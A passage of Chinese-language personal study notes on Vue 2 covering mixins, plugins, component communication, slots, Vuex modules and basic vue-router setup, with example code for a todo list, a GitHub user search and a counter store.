  name: "App",
  components: {
     School
  }
}
</script>
```

## minin混入

> 组件共用的配置提取成一个混入对象

### 使用方法

```js
(1)定义混合
export const mixin = {
    data(){
        return{
            size: '18cm'
        }
    }
}

(2)使用混合
import {mixin} from '../mixin';
mixins:[mixin] //局部 -组件
Vue.mixin(mixin) //全局 -main.js
```

## 插件

> 功能：用于增强vue
>
> 本质：包含install方法的一个对象，第一个参数是Vue，第二个以后的参数是传递的数据

### 定义插件

```js
export default {
    install(Vue,options) {
        Vue.filters()
        Vue.directive()
        Vue.mixin()
        Vue.prototype.$myMethod=function (){}
    }
}
```

### 使用插件

```js
Vue.use(plugin);
```

## scoped样式

> 让样式在局部生效，防止冲突

```html
<style scoped></style>
```

<img src="https://note-1259190304.cos.ap-chengdu.myqcloud.com/note/202201202039365.png" alt="image-20220120203846463" style="zoom:80%;" />

<img src="https://note-1259190304.cos.ap-chengdu.myqcloud.com/note/202201202039883.png" alt="image-20220120203904943" style="zoom:80%;" />

### 扩展

<img src="https://note-1259190304.cos.ap-chengdu.myqcloud.com/note/202201202046762.png" alt="image-20220120204617812" style="zoom:80%;" />

```less
<style lang="less" scoped>
h2 {
  color: #1c036c;
  font-weight: 700;
  h3{
    font-size: 30px;
  }
}
</style>
默认vue不识别其他的语法，需要添加加载器
```

<img src="https://note-1259190304.cos.ap-chengdu.myqcloud.com/note/202201202048064.png" alt="image-20220120204754969" style="zoom:80%;" />

```powershell
npm view webpack versions #查看webpack版本
npm view less-loader versions #查看less-loader版本
```

<img src="https://note-1259190304.cos.ap-chengdu.myqcloud.com/note/202201202051917.png" alt="image-20220120205116528" style="zoom:80%;" />

### 安装less加载器

```js
npm i less-loader@7 #安装7以上版本
npm install less save-dev
```



## TodoList案例关键点

### 组件命令注意不要和html元素相同

```html
比如：Header
```

### 父组件里面的子组件的子组件import的路径

```js
import TodoItem from "@/components/TodoItem";
```

[(16条消息) Vue解决报错1_This relative module was not found: * ./components/Login.vue in ./src/router/index.js_xiaosi的博客-CSDN博客](https://blog.csdn.net/qq_24654501/article/details/113574302)

### 父组件个子组件传值

```html
<TodoList :todos="todos"/>
<script>
data() {
    return {
      todos: [
        {id: '001', title: '吃饭', done: false},
        {id: '002', title: '睡觉', done: true},
        {id: '003', title: '打游戏', done: false}
      ]
    }
  }
</script>

<TodoItem v-for="item in todos" :key="todos.id" :item="item"/>
<script>
props:["todos"]
</script>

以下修改为$emit 父组件给子组件c
-------
<TodoHeader @addTodo="addTodo"/>
<script>
methods: {
            // 增加
            addTodo(itemObj) {
                this.todos.unshift(itemObj);
            }
}
</script>

<script>
<template>
  <div class="header">
    <input type="text" v-model.trim="addTodoTitle" placeholder="请输入待办事项，按回车键" @keyup.enter="add($event)"/>
  </div>
</template>
methods: {
    add(event) {
      if (this.addTodoTitle != '') {
        const itemObj = {id: nanoid(), title: this.addTodoTitle, done: false};
        this.$emit('addTodo',itemObj);
      }
    }
  }
</script>
```

### 子组件给父组件传值

```html
<TodoHeader :addTodo="addTodo"/>
methods: {
    addTodo(itemObj) {
      this.todos.unshift(itemObj);
    }
  }

<input type="text" v-model.trim="addTodoTitle" placeholder="请输入待办事项，按回车键" @keyup.enter="add($event)"/>
<script>
props: ['addTodo'],
methods: {
    add(event) {
      if (this.addTodoTitle != '') {
        const itemObj = {id: nanoid(), title: this.addTodoTitle, done: false};
        this.addTodo(itemObj);
      }
    }
  }
</script>
```

> :warning:【data,props,methods,computed】不要有相同的名称！

### 组件任意传值

```js
beforeCreate() {
        Vue.prototype.$bus = this
    }

----------------------------------------------------------------
methods: {
            // 勾选或取消
            changeTodo(id) {
                this.todos.forEach((item) => {
                    if (item.id == id) {
                        item.done = !item.done;
                    }
                })
            }
            ,
            deleteTodo(id) {
                this.todos = this.todos.filter((item) => {
                    return item.id != id;
                })
            }
        }
mounted() {
            this.$bus.$on('changeTodo',this.changeTodo);
            this.$bus.$on('deleteTodo',this.deleteTodo);
        },
        beforeDestroy() {
            this.$bus.$off('changeTodo');
            this.$bus.$off('deleteTodo');
        }

----------------------------------------------------------------
methods: {
            doneChanged(id) {
                this.$bus.$emit('changeTodo',id);
            },
            delItem(id) {
                this.$bus.$emit('deleteTodo',id);
            }
        },
```



### 点击复选框值改变

> 暂时使用函数，父组件->子组件
>
> :stop_sign:不推荐使用v-model:checked="xxx",如果xxx是对象里面的值，可以，如果不是，vue不允许。因为vue监视的对象的改变的机制
>
> **v-model绑定的值不能是传过来的值，props的值是不能修改的**

```html
App.vue
	TodoList.vue
		TodoItem.vue

App 传递给子组件
<TodoList :todos="todos" :changeTodo="changeTodo"/>
<script>
    data() {
            return {
                todos: [
                    {id: '001', title: '吃饭', done: false},
                    {id: '002', title: '睡觉', done: true},
                    {id: '003', title: '打游戏', done: false}
                ]
            }
        },
        methods: {
            // 勾选或取消
            changeTodo(id) {
                this.todos.forEach((item) => {
                    if (item.id == id) {
                        item.done = !item.done;
                    }
                })
            }
        }
</script>

TodoList props接收，传递给子组件
<TodoItem v-for="item in todos" :key="todos.id" :item="item" :changeTodo="changeTodo"/>
<script>
props:["changeTodo"]
</script>

TodoItem
<input type="checkbox" v-model:checked="item.done" @change="doneChanged(item.id)"/>
<script>
    export default {
        name: "TodoItem",
        methods: {
                doneChanged(id) {
                    this.changeTodo(id);
                }
        },
        props: ['changeTodo']
    }
</script>
```



## 组件自定义事件

### 子组件向父组件传值

#### $emit实现

```html
通过父组件向子组件绑定一个自定义事件，等子组件触发这个事件，就触发getValue函数
<TodoFooter v-on:customize="getValue"/>
<!--简写-->
<TodoFooter @customize="getValue"/>
<!--只触发一次 <TodoFooter v-on:customize.once="getValue"/> -->
<script>
    data() {
            return {
                context: [
                    {completed: '', unfinished: ''}
                ]
            }
        }，
methods: {
            getValue(completed, unfinished) {
                console.log('已完成数量：' + completed, '未完成数量：' + unfinished)
            }
        }
</script>

<button @click="fromFather()">from父组件传值</button>
<script>
methods:{
    fromFather() {
                this.$emit('customize',this.doneTotle, this.todos.length)
            }
}
</script>
```

#### ref实现

```html
<TodoFooter ref="inputValue"/>
<script>
methods: {
            getValue(completed, unfinished) {
                console.log('已完成数量：' + completed, '未完成数量：' + unfinished)
},
mounted() {
            setTimeout(()=>{
                this.$refs.inputValue.$on('customize', this.getValue);
            },2000)；
    		//只触发一次
            //this.$refs.inputValue.$once('customize', this.getValue);
}
</script>

<button @click="fromFather()">from父组件传值</button>
<script>
methods:{
    fromFather() {
          this.$emit('customize',this.doneTotle, this.todos.length)
    }
}
</script>
```

### 解绑自定义事件

```js
//解绑单个自定义事件
this.$off('customize')
//解绑多个自定义事件
this.$off(['xxx','xxx'])
//解绑所有的自定义事件
this.$off()
```

### 子组件向父组件传递的值显示在页面上

> 赋值给data，使用插值语法显示到页面上

```html
<h2>{{context[0].completed}}{{context[0].unfinished}}</h2>
<TodoFooter :todos="todos"
            v-on:customize="getValue" ref="inputValue"/>
<script>
data() {
            return {
                todos: [
                    {id: '001', title: '吃饭', done: false},
                    {id: '002', title: '睡觉', done: true},
                    {id: '003', title: '打游戏', done: false}
                ],
                context: [
                    {completed: '', unfinished: ''}
                ]
            }
        }
        ,
        methods: {
            getValue(completed, unfinished) {
                console.log('已完成数量：' + completed, '未完成数量：' + unfinished)
                this.context[0].completed = completed;
                this.context[0].unfinished = unfinished;
            }
        }
        ,
        mounted() {
            setTimeout(() => {
                this.$refs.inputValue.$on('customize', this.getValue);
            }, 2000)
        }
</script>
```

> :warning:注意：回调函数简写时this指向
>
> ```js
> this.$refs.inputValue.$on('customize', function(completed, unfinished){
>     this的指向是触发事件的实例对象，谁触发customize就是谁
> });
> this.$refs.inputValue.$on('customize',(completed, unfinished)=>{
>     this的指向是外面的组件实例对象
> });
> ```
>
> ```js
> 绑定原生DOM事件
> <Student> @click.native="xxx" </Student>
> ```



## 全局事件总线

> 组件间通信方式，适用于**任意组件间通信**

### 安装

```js
new Vue({
    beforeCreate(){
		Vue.prototype.$bus = this;	
    }
})
```

### 使用

(1)**接收数据**：A组件想接收数据，则A组件中的$bus绑定自定义事件，事件的**回调留在A组件自身**

```js
methods(){
    demo(data){}
}
mounted(){
    this.$bus.$on('xxx',this.demo)
}
```

(2)提供数据：`this.$bus.$emit('xxx',数据)`

> 最好在`beforeDestroy`钩子中，用`$off`解绑当前组件所用到的事件



## 消息订阅与发布

> 组件间通信方式，适用于**任意组件间通信**

### 使用步骤

1.安装：pubsub `npm i pubsub.js`

2.引入：`import pubsub from 'pubsub.js'`

3.接收数据：A组件想接收数据，则A组件中订阅消息，订阅的回调留在A组件本身

```js
methods(){
    demo(data){}
    mounted(){
        this.pid = pubsub.subscribe('xxx',this.demo)//订阅消息,可改为箭头函数，使用funtion(){}匿名函数的this作用域是unfiend
    }
}
```

4.提供数据：`pubsub.publish('xxx',数据)`

5.最好在beforeDestory钩子中，用pubsub.unsubscribe(pid)取消订阅



## $nextTick

将回调延迟到下次 DOM 更新循环之后执行。在修改数据之后立即使用它，然后等待 DOM 更新。它跟全局方法

```js
<input v-show="item.isEdit" type="text" v-model="item.title" @blur="alterTitle($event,item)" ref="inputTitle">

editItem(item) {
                if (item.hasOwnProperty('isEdit')) {
                    item.isEdit = true;
                }
                this.$set(item, 'isEdit', true)
                this.$nextTick(function () {
                    this.$refs.inputTitle.focus();
                });
            }
```

## 过渡与动画

<img src="https://note-1259190304.cos.ap-chengdu.myqcloud.com/note/202202072103821.png" alt="image-20220207210255578" style="zoom:80%;" />

### 用法

`1.准备样式`

#### 元素进入的样式

1. v-enter：进入的起点
2. v-enter-active：进入过程中
3. v-enter-to：进入的终点

#### 元素离开的样式

1. v-leave：离开的起点
2. v-leave-active：离开的过程中
3. v-leave-to：离开的终点



`2.使用<transition>包裹要过渡的元素，并配置name属性`

```vue
<transition name="hello">
    <h1 v-show="isShow">
        你好啊！
    </h1>
</transition>
```

`3.若有多个元素需要过渡，则需要使用<transition-group>，且每个元素都要指定key值`





# Vue中的ajax

## 配置代理 跨域问题

通过 `vue.config.js` 中的 `devServer.proxy` 选项来配置

```js
module.exports = {
  devServer: {
    proxy: 'http://localhost:4000'
  }
}
```

> :warning: 问题：
>
> 1. 不能配置多个代理
> 2. 本机存在与public里面的文件如果和请求地址相同，则不会发送请求到代理服务器

如果你想要更多的代理控制行为，也可以使用一个 `path: options` 成对的对象

```js
module.exports = {
  devServer: {
    proxy: {
      '/api': { //匹配所有以api开头的地址
        target: 'http://119.2.453.423:8080',
          pathRewrite:{'^/api',''},
        ws: true,//用于支持websocket
        changeOrigin: true//（请求头中的host值【真/假】）告诉要请求的服务器，来自哪个地址
      },
      '/foo': {
        target: '<other_url>'
      }
    }
  }
}
```

## github案例

<img src="https://note-1259190304.cos.ap-chengdu.myqcloud.com/note/202202082155048.png" alt="image-20220208215504930" style="zoom:80%;" />

### App.vue

```vue
<template>
  <div id="app">
    <Search></Search>
    <List></List>
  </div>
</template>

<script>
  import 'jquery/dist/jquery.min'
  import 'bootstrap/dist/css/bootstrap.min.css'
  import Search from './components/Search'
  import List from './components/List'
export default {
  name: 'App',
  components: {
    Search,List,
  }
}
</script>
```

### Search.vue

```vue
<template>
    <div>
            <div class="form-group">
                <label for="exampleInputEmail1">Search github user</label>
                <input type="text" class="form-control" id="exampleInputEmail1" placeholder="输入用户名"
                       v-model="inputKeyWord">
                <button type="submit" @click="searchUser()" class="btn btn-default">查询</button>
            </div>

    </div>
</template>

<script>
    import axios from 'axios';

    export default {
        name: "Search",
        data() {
            return {
                inputKeyWord: ''
            }
        },
        methods: {
            searchUser() {
                console.log('触发点击事件',this.inputKeyWord);
                this.$bus.$emit('updateListData',{isFirst: false,isLoading:true,errMsg:'',users:[]});
                axios.get(`https://api.github.com/users?q=${this.inputKeyWord}`).then(
                    response => {
                        console.log('success',response.data)
                        this.$bus.$emit('updateListData',{isLoading:false,errMsg:'',users:response.data});
                    },
                    error => {
                        console.log('error',error.message)
                        this.$bus.$emit('updateListData',{isLoading:false,errMsg:error.message,users:[]});

                    }
                )
            }
        }
    }
</script>
```

### List.vue

```vue
<template>
    <div>
        <div v-show="info.isFirst">欢迎使用！</div>
        <div v-show="info.users.length!=0" v-for="user in info.users" :key="user.login">
            <a :href="user.html_url">
                <img :src="user.avatar_url" alt="..." class="img-thumbnail">
            </a>
            <p class="text-primary">{{user.login}}</p>
        </div>
        <div v-show="info.isLoading">加载中。。。</div>
        <div v-show="info.isLoading">{{info.errMsg}}</div>
    </div>
</template>

<script>
    export default {
        name: "List",
        data() {
            return {
                info:{
                    users: [],
                    isFirst:true,
                    isLoading:false,
                    errMsg: ''
                }
            }
        },
        mounted() {
            this.$bus.$on('updateListData', (dadaObj) => {
                this.info={...this.info,...dadaObj};
            })
        }
    }
</script>

<style scoped>
    img {
        width: 100px;
        height: 100px;
    }
    div {
        display: inline-block;
        margin-left: 10px;
    }
</style>
```



## vue-resource

```vue
#下载插件
npm i vue-resource

#main.js
-----------------
<script>
import vueResouce from 'vue-resource'
Vue.use(vueResouce);
</script>
---------------------

#使用
<script>
    this.$http.get("").then(
{
response=>{
	response.data
},error=>{
	error.message
}
})
</script>
```



## solt插槽（默认）

让父组件向子组件指定位置插入html结构，适用于 `父组件 ==> 子组件`

```vue
App.vue
<Student>
    <img src="xxx">
</Student>

Student.vue
<template>
	<div>
        <h3>xxx</h3>
        <slot>没有传递结构时，显示</slot>
    </div>
</template>
```

## 具名插槽

```vue
App.vue
<Student>
    <img slot="center" src="xxx">
    <!--不生成dom元素-->
    <template slot="footer" 或者 v-slot:footer（只能用在template上）>
    	<img src="xxx">
    	<h3>也想放在footer里面</h3>
    </template>
</Student>

Student.vue
<template>
	<div>
        <h3>xxx</h3>
        <slot name="center">没有传递结构时，显示</slot>
        <slot name="footer">没有传递结构时，显示</slot>
    </div>
</template>
```

## 作用域插槽

数据在组件的自身，但根据数据生成的结构需要组件的使用者来决定

```vue
App.vue
<Student>
    #使用template的scope属性接收
    <template scope="data"(新语法slot-scope="data") 或者es6解构赋值 scope="{games}",下面直接使用games>
    	<ul>
        	<li v-for="(item,index) in data.games" :key="index">{{item}}</li>
   		</ul>
    </template>
    <template slot-scope="data">
    	<ol>
        	<li v-for="(item,index) in data.games" :key="index">{{item}}</li>
   		</ol>
    </template>
</Student>

Student.vue
<template>
	<div>
        <h3>xxx</h3>
        #向使用该插槽的组件传值
        <slot :data="games">没有传递结构时，显示</slot>
    </div>
</template>
<script>
	new Vue({
       data(){
           return{
               games:['GTA5','荒野','4399']
           }
       } 
    });
</script>
```



# vuex

<img src="https://note-1259190304.cos.ap-chengdu.myqcloud.com/note/202202092118357.png" alt="image-20220209211814287" style="zoom: 80%;" />

<img src="https://note-1259190304.cos.ap-chengdu.myqcloud.com/note/202202092121467.png" alt="image-20220209212121141" style="zoom:80%;" />



## 什么时候需要使用？

<img src="https://note-1259190304.cos.ap-chengdu.myqcloud.com/note/202202092125676.png" alt="image-20220209212457508" style="zoom: 80%;" />

**状态（数据）共享！**



## vuex工作原理

<img src="https://note-1259190304.cos.ap-chengdu.myqcloud.com/note/202202092144381.png" alt="image-20220209214418769" style="zoom:80%;" />

## 搭建vuex环境

| vue-version | name       | version |
| ----------- | ---------- | ------- |
| Vue2.x      | Vuex       | 3.x     |
| Vue2.x      | Vue-router | 3.x     |
| Vue2.x      | Vue-cli    | 3.x 4.x |
| Vue3.x      | Vuex       | 4.x     |
| Vue3.x      | Vue-router | 4.x     |
| Vue3.x      | Vuex-cli   | 4.x     |

```javascript
创建文件 src/store/index.js

//全局安装[--save生产环境]
npm install -g @vue/cli
//创建vue脚手架【2.6.11】我的vue是2.x版本的，如果是vue3，请下载vuex4.x的版本
vue create 项目名
//下载vuex插件
//查看npm所有版本
npm view vuex versions
//此时下载指定版本
npm i vuex@3.6.2
```

```javascript
//index.js
//引入vue
import Vue from 'vue';
//引入vuex
import Vuex from 'vuex';
//应用vuex插件
Vue.use(Vuex);

//准备actions对象-响应组件中用户的动作
const actions = {}
//准备mutations对象-修改state中的数据
const mutations = {}
//准备state对象-保存具体的数据
const state = {}

//创建store
new Vuex.Store({
    actions,
    mutations,
    state
});
export default store;
```

```javascript
//main.js
import Vue from 'vue'
import App from './App.vue'
import vueResouce from 'vue-resource'
import store from './store/index'

Vue.config.productionTip = false
Vue.use(vueResouce);
new Vue({
    render: h => h(App),
    store: store,
    beforeCreate() {
        Vue.prototype.$bus = this
    }
}).$mount('#app')
```

> :warning: 为什么不在main.js中引入vuex？
>
> 因为使用顺序要先使用vuex，才能使用store
>
> 不管是什么顺序，import会先解析，再执行其他代码，所以不能放在main.js中

## 基本使用

组件读取vuex中的数据:`$store.state.num`

组件修改vuex中的数据：`$store.dispathch('action中的方法名','数据')或 $store.commit('mutations中的方法名','数据')`

> 若没有网络请求或者其他业务逻辑，组件中也可以越过actions，即不写`dispatch`，直接编号`commit`

## 求和案例

### Count.vue

```html
<template>
    <div>
        <h2>当前求和：{{$store.state.num}}</h2>
        <select v-model.number="num">
            <option value="1">1</option>
            <option value="2">2</option>
            <option value="3">3</option>
        </select>
        <button @click="add">+</button>
        <button @click="reduce">-</button>
        <button @click="addOdd">当前求和为奇数再加</button>
        <button @click="addWait">等一等在加</button>
    </div>
</template>

<script>
    export default {
        name: "Count",
        data() {
            return {
                num: 1
            }
        },
        methods: {
            add() {
                // this.$store.dispatch('jia', this.num);
                //直接通知mutations，不需要actions
                this.$store.commit('JIA', this.num);
            },
            reduce() {
                // this.$store.dispatch('jian', this.num);
                this.$store.commit('JIAN', this.num);
            },
            addOdd() {
                this.$store.dispatch('jiaOdd', this.num);
            },
            addWait() {
                this.$store.dispatch('jiaWait', this.num);
            }
        }
    }
</script>
```

### App.vue

```html
<template>
  <div id="app">
    <Count></Count>
  </div>
</template>

<script>
import Count from "./components/Count";
export default {
  name: 'App',
  components: {
    Count
  }
}
</script>

<style>
#app {
  font-family: Avenir, Helvetica, Arial, sans-serif;
  -webkit-font-smoothing: antialiased;
  -moz-osx-font-smoothing: grayscale;
  text-align: center;
  color: #2c3e50;
  margin-top: 60px;
}
</style>
```

### index.js

```js
import Vue from "vue";
//引入vuex
import Vuex from 'vuex';
//引入vuex插件
Vue.use(Vuex);
//用于响应组件中的动作
const actions = {
    // jia(content, value) {
    //     content.commit('JIA', value);
    // },
    // jian(content, value) {
    //     content.commit('JIAN', value);
    // },
    jiaOdd(content, value){
        if (content.state.num %2 != 0){
            content.commit('JIA', value);
        }
    },
    jiaWait(content, value){
        setTimeout(() => {
            content.commit('JIA', value);
        },500)
    }
};
//用于操作数据
const mutations = {
    JIA(state, value) {
        state.num += value;
    },
    JIAN(state, value) {
        state.num -= value;
    },

};
//用于存储数据
const state = {
    num: 0
};
//创建并暴露store（默认暴露）
export default new Vuex.Store({
    actions,
    mutations,
    state
})
```

### main.js

```js
import Vue from 'vue'
import App from './App.vue'
import store from './store'

Vue.config.productionTip = false;

new Vue({
    render: h => h(App),
    store,
    beforeCreate() {
        Vue.prototype.$bus = this;
    }
}).$mount('#app')
```

### 遇到的坑!!!

> vue2 => vuex3
>
> vue3 => vuex4
>
> 如果出现Object function 报错请检查vuex版本
>
> ```js
> 卸载
> npm uninstall vuex
> ```
>
> ```````json
> "dependencies": {
> "vue": "^2.6.11",
> "vuex": "^3.6.2"
> },
> "devDependencies": {
> "@vue/cli-plugin-babel": "~4.5.0",
> "@vue/cli-plugin-eslint": "~4.5.0",
> "@vue/cli-service": "~4.5.0",
> }
> ```````

## getters

```js
//用于对state中数据的处理
const getters = {
    bigSum(state) {
        return Math.PI * state.num;
    }
}
//创建并暴露store（默认暴露）
export default new Vuex.Store({
    actions,
    mutations,
    state,
    getters
})
```

组件中读取数据：`$store.getters.bigSum`

## mapState,mapGetters

> mapState：映射state中的数据为计算属性
>
> mapGetters：映射getters中的数据为计算属性

```js
computed:{
            //自己写计算属性
             author() {
                 return this.$store.state.author;
             },
             age(){
                 return this.$store.state.age;
             },
             bigSum(){
                 return this.$store.getters.bigSum;
             },
        },
```

```js
import {mapState,mapGetters} from 'vuex'
computed:{
            //结借助mapState生成计算属性，从state中读取数据。对象写法
             ...mapState({author:'author', age:'age'}),
            //结借助mapState生成计算属性，从state中读取数据。数组写法
            ...mapState(['author','age']),

            ...mapGetters({bigSum:'bigSum'}),
             ...mapGetters(['bigSum']),
        },
```

## mapActions,mapMutations

> mapActions：生成与`Actions`对话的方法，包含`$store.dispatch(xxx)`的函数
>
> mapMutations：生成与`mutations`对话的方法，包含`$store.commit(xxx)`的函数

```js
<button @click="add(num)">+</button>
<button @click="reduce(num)">-</button>
<button @click="addOdd(num)">当前求和为奇数再加</button>
<button @click="addWait(num)">等一等在加</button>
<!-- 需要自己传值 -->
//负责传递的是事件对象
import {mapMutations,mapActions} from 'vuex'
methods: {
            // add() {
            //     // this.$store.dispatch('jia', this.num);
            //     //直接通知mutations，不需要actions
            //     this.$store.commit('JIA', this.num);
            // },
            // reduce() {
            //     // this.$store.dispatch('jian', this.num);
            //     this.$store.commit('JIAN', this.num);
            // },
            //借助Matations生成对应的方法，方法中会调用commit去联系Mutations(对象写法)
            ...mapMutations({add:'JIA',reduce:'JIAN'}),
            // addOdd() {
            //     this.$store.dispatch('jiaOdd', this.num);
            // },
            // addWait() {
            //     this.$store.dispatch('jiaWait', this.num);
            // }
            //借助mapActions生成对应的方法，方法中会调用dispatch去联系Action(对象写法)
            ...mapActions({addOdd:'jiaOdd',addWait:'jiaWait'})
        }
```

## 多组件共享数据

> 使用`mapState`即可

```js
<h3 style="color: red">人员列表组件的总人数：{{personList.length}}</h3>
computed: {
	...mapState(['author','age','personList']),
},
----------------------------------------------------------------------
h2 style="color: #0dff1d">求和：{{num}}</h2>
computed: {
    ...mapState({personList: 'personList',num:'num'})
},
```

## vuex模块化 namespace

```js
export default {
    namespaced: true, //开启命令空间，可以让mapxxx识别
    actions: {...},
    mutations: {...},
    state: {...},
    getters: {...}
};
```

```js
#模块化main.js
import Vue from "vue";
//引入vuex
import Vuex from 'vuex';
//引入vuex插件
Vue.use(Vuex);

import countOption from "./count";
import personOption from "./person";

//创建并暴露store（默认暴露）
export default new Vuex.Store({
    modules: {
        person: personOption,
        count: countOption
    }
})
```

<img src="https://note-1259190304.cos.ap-chengdu.myqcloud.com/note/202202121922990.png" alt="image-20220212192237604" style="zoom:80%;" />

```js
#count.js
------------------------------
export default {
    namespaced: true,
    actions: {
        jiaOdd(content, value) {
            if (content.state.num % 2 != 0) {
                content.commit('JIA', value);
            }
        },
        jiaWait(content, value) {
            setTimeout(() => {
                content.commit('JIA', value);
            }, 500)
        }
    },
    mutations: {
        JIA(state, value) {
            state.num += value;
        },
        JIAN(state, value) {
            state.num -= value;
        },
    },
    state: {
        num: 0,
        author: '涂鏊飞',
        age: 22,
    },
    getters: {
        bigSum(state) {
            return Math.floor(Math.PI * state.num);
        }
    }
};
------------------------------
#person.js
------------------------------
import axios from 'axios';
import {nanoid} from "nanoid";

export default {
    namespaced: true,
    actions: {
        addPersonWang(context, value) {
            if (value.cname.indexOf('王') !== -1) {
                context.commit('ADD_PERSON', value);
            } else {
                console.log('只能添加姓【王】的');
            }
        },
        addPersonServer(context) {
            axios.get('https://api.uixsj.cn/hitokoto/get?type=social').then(
                response => {
                    context.commit('ADD_PERSON',{id:nanoid(),cname:response.data,clength: Math.round(Math.random(20) * 100) + "cm"})
                },
                error => {
                    console.log(error.message)
                }
            )
        }
    },
    mutations: {
        ADD_PERSON(state, value) {
            state.personList.unshift(value);
        }
    },
    state: {
        personList: [
            {id: '7aafcdf', cname: '占山', clength: '18cm'},
            {id: '34fergs', cname: '底层', clength: '12cm'},
            {id: '54vdgfd', cname: '胜多负少的', clength: '13cm'},
        ]
    },
    getters: {
        showFirstPerson(state) {
            return state.personList[0].cname;
        }
    }
}
```

```html
#Count.vue
------------------------------------------------
<template>
    <div>
        <code>作者：{{author}}</code>
        <code>年龄：{{age}}</code>
        <h2>当前求和：{{bigSum}}</h2>
        <select v-model.number="num">
            <option value="1">1</option>
            <option value="2">2</option>
            <option value="3">3</option>
        </select>
        <button @click="add(num)">+</button>
        <button @click="reduce(num)">-</button>
        <button @click="addOdd(num)">当前求和为奇数再加</button>
        <button @click="addWait(num)">等一等在加</button>
        <h3 style="color: red">人员列表组件的总人数：{{personList.length}}</h3>
    </div>
</template>

<script>
    import {mapState,mapGetters,mapMutations,mapActions} from 'vuex'
    export default {
        name: "Count",
        data() {
            return {
                num: 1
            }
        },
        computed:{
            ...mapState('count',['author','age']),
            ...mapState('person',['personList']),
            ...mapGetters('count',{bigSum:'bigSum'}),
        },
        methods: {
            ...mapMutations('count',{add:'JIA',reduce:'JIAN'}),
            ...mapActions('count',{addOdd:'jiaOdd',addWait:'jiaWait'})
        }
    }
</script>
------------------------------------------------
#Perason.vue
------------------------------------------------
<template>
    <div>
        <h2 style="color: #0dff1d">求和：{{num}}</h2>
        <h3>列表第一个人：{{showFirstPerson}}</h3>
        <h2>人员列表</h2>
        <input type="text" placeholder="输入要添加的姓名" v-model="iname">
        <button @click="addCname()">添加</button>
        <button @click="addPersonWang()">添加姓王的</button>
        <button @click="addPersonServer()">随机添加</button>
        <ul>
            <li v-for="p in personList" :key="p.id">【{{p.cname}}】--【{{p.clength}}】</li>
        </ul>
    </div>
</template>

<script>
    import {nanoid} from 'nanoid'

    export default {
        name: "Person",
        data() {
            return {
                iname: '',
            }
        },
        computed: {
            personList() {
                return this.$store.state.person.personList;
            },
            num() {
                return this.$store.state.count.num;
            },
            showFirstPerson() {
                return this.$store.getters['person/showFirstPerson'];
            },
        },
        methods: {
            addCname() {
                const personObj = {id: nanoid(), cname: this.iname, clength: Math.round(Math.random(20) * 100) + "cm"}
                this.iname = '';
                this.$store.commit('person/ADD_PERSON', personObj);
            },
            addPersonWang() {
                const personObj = {id: nanoid(), cname: this.iname, clength: Math.round(Math.random(20) * 100) + "cm"}
                this.iname = '';
                return this.$store.dispatch('person/addPersonWang', personObj);
            },
            addPersonServer() {
                this.$store.dispatch('person/addPersonServer');
            }
        }
    }
</script>
```

```js
#App.vue
<template>
  <div id="app">
    <Count></Count>
    <Person></Person>
  </div>
</template>

<script>
import Count from "./components/Count";
import Person from "./components/Person";
export default {
  name: 'App',
  components: {
    Count,Person
  }
}
</script>

<style>
#app {
  font-family: Avenir, Helvetica, Arial, sans-serif;
  -webkit-font-smoothing: antialiased;
  -moz-osx-font-smoothing: grayscale;
  text-align: center;
  color: #2c3e50;
  margin-top: 60px;
}
</style>
```

<img src="https://note-1259190304.cos.ap-chengdu.myqcloud.com/note/202202121928996.png" alt="image-20220212192811480" style="zoom:80%;" />

### 组件读取state数据

```js
#自己读取
personList() {
     return this.$store.state.person.personList;
},
#mapState读取
...mapState('count',['author','age']),
...mapState('person',['personList']),
```

### 组件读取getters数据

```js
#自己读取
showFirstPerson() {
   return this.$store.getters['person/showFirstPerson'];
},
#mapGetters读取
...mapGetters('count',{bigSum:'bigSum'}),
```

### 组件调用dispatch

```js
#自己读取
-----------------------自己传参
addPersonWang() {
  const personObj = {id: nanoid(), cname:this.iname,clength:Math.round(Math.random(20) * 100) + "cm"}
  return this.$store.dispatch('person/addPersonWang', personObj);
},
-------------------------网络请求数据
addPersonServer() {
     this.$store.dispatch('person/addPersonServer');
}

#mapActions
...mapActions('count',{addOdd:'jiaOdd',addWait:'jiaWait'})
```

### 组件调用commit

```js
#自己调用
addCname() {
   const personObj = {id: nanoid(), cname: this.iname, clength:Math.round(Math.random(20) * 100) + "cm"}
    this.iname = '';
    this.$store.commit('person/ADD_PERSON', personObj);
},
#mapMutations
...mapMutations('count',{add:'JIA',reduce:'JIAN'}),
```



# vue-router

## 了解

vue插件库，用来实现SPA应用（单页面）



> 整个页面只有一个完整的页面
>
> 点击页面中导航链接，不会刷新页面，只做局部更新
>
> 数据通过ajax请求

## 路由的理解

1. 一组映射关系（key-value）
2. key：路径，value：function或component

### 前端路由

value是compoent，展示页面内容。

当浏览器路径改变时，展示对应的组件

### 后端路由

value是function，处理客户端提交的请求。

服务器接收到请求，根据请求路径找到匹配的函数来处理请求，返回响应数据



## 基本路由

### 安装vue-router

| vue-version | name       | version |
| ----------- | ---------- | ------- |
| Vue2.x      | Vuex       | 3.x     |
| Vue2.x      | Vue-router | 3.x     |
| Vue2.x      | Vue-cli    | 3.x 4.x |
| Vue3.x      | Vuex       | 4.x     |
| Vue3.x      | Vue-router | 4.x     |
| Vue3.x      | Vuex-cli   | 4.x     |

```powershell
npm i vue-router@3.5.3
```

### 配置路由

```js
|-src
|--router
|---index.js
===================================
import VueRouter from 'vue-router';
import About from "../components/About";
import Home from "../components/Home"
export default new VueRouter({
    routes: [
        {
            path: '/about',
            component: About
        },
        {
            path: '/home',
            component: Home
        },
    ]
})
==============================================
#main.js
import Vue from 'vue'
import App from './App.vue'
import VueRouter from 'vue-router'
import router from './router'

Vue.config.productionTip = false
Vue.use(VueRouter)
new Vue({
    render: h => h(App),
    router: router,
}).$mount('#app')
```

```vue
#App.vue
========================================
<template>
  <div>
    <div class="row">
      <Banner/>
    </div>
    <div class="row">
      <div class="col-xs-2 col-xs-offset-2">
        <div class="list-group">
            #实现切换active-class可配置被选中的样式
          <router-link class="list-group-item" active-class="active" to="/about">About</router-link>
          <router-link class="list-group-item" active-class="active" to="/home">Home</router-link>
        </div>
      </div>
      <div class="col-xs-6">
        <div class="panel">
          <div class="panel-body">
              #指定展示位置
            <router-view></router-view>
          </div>
        </div>
      </div>
    </div>
  </div>
</template>

<script>
import Banner from "./components/Banner";
export default {
  name: 'App',
  components: {
    Banner

  }
}
</script>
```

```html
#Home.vue,About.vue,Banner.vue
<template>
    <div>
        <h2>我是About的内容</h2>
    </div>
</template>

<script>
    export default {
        name: "About"
    }
</script>
=============================================
<template>
